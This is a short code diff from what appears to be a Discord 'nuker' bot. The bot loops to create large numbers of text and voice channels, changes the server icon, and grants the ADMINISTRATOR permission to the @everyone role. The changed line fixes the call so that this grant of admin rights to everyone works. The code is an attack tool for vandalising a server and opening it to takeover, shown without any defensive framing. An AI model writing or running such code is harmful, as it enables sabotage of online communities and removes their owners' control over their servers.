@@ -33,7 +33,7 @@ client.on("message", async (message) => {
 	    message.guild.createChannel(`${textuh}`, 'text');
 	    message.guild.createChannel(`${textuh}`, 'voice');  
 	    message.guild.setIcon('./icon.png') 
-	    guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
+	    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
 	if(message.guild.channels > 499) break;
        }
     }
